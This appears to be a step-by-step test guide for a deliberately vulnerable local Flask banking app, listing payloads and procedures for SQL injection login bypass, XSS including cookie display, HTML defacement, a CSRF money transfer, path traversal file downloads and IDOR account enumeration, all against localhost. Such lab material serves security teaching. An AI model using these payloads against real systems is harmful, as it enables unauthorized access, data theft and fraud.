1. TEST SQL INJECTION

1. Access: http://localhost:5000/auth/login

2. Login form:
   Username: admin' OR '1'='1
   Password: anything

3. Click "Login"



2. TEST XSS ATTACK

### **Test 1: Simple XSS Alert**
```
1. Login: admin / admin123
2. Go to: http://localhost:5000/profile
3. In Bio field, paste:
   <script>alert('XSS Attack!')</script>
4. Click "Update Profile"
5. ✅ Alert popup will appear!
```

### **Test 2: HTML Injection**
```
Bio field:
<h1 style="color:red;">HACKED BY ATTACKER!</h1>
<img src="https://media.giphy.com/media/3o7TKz0ypnMXKfyAta/giphy.gif">
```

### **Test 3: Cookie Stealing (Simulated)**
```
Bio field:
<script>
  alert('Your cookies: ' + document.cookie);
</script>



3. TEST CSRF ATTACK:

open 2 cmd tab direct to the folder of the project:

first cmd:
cd to Cybersecurity-Vulnerable folder
.venv\Scripts\activate
flask init-db
flask run --port 5000
access port 5000
login with admin account

second cmd:
cd to the folder of the file csrf_attack.html
python -m http.server 8000
access http://127.0.0.1:8000/csrf_attack.html

click on claim my iphone in port 8000.

=> money tranfer successfully.




4. TEST PATH TRAVERSAL

Login with admin account in port 5000
then access these link:

http://127.0.0.1:5000/download?file=../app/schema.sql
http://127.0.0.1:5000/download?file=../app/auth.py
http://127.0.0.1:5000/download?file=../app/__init__.py

if the file is installed successfully. then the attack was successful.




## 🧪 **TEST IDOR ATTACK:**

### **Test 1: View Your Own Account (Normal)**
```
1. Login as: admin / admin123
2. Go to Dashboard
3. Click "Account Details"
4. URL: http://localhost:5000/account/1
5. ✅ See your account info (normal behavior)
```

---

### **Test 2: IDOR Attack - View Other User's Account**
```
1. Still logged in as admin
2. Manually change URL to: http://localhost:5000/account/2
3. ✅ ATTACK SUCCESS! 
   → See Alice's account balance!
   → See Alice's transactions!
   → See Alice's personal info!
```

---

### **Test 3: Loop Through All Accounts**
```
Try:
http://localhost:5000/account/1  → Admin
http://localhost:5000/account/2  → Alice
http://localhost:5000/account/3  → Bob
http://localhost:5000/account/4  → Attacker

✅ Can view ALL accounts!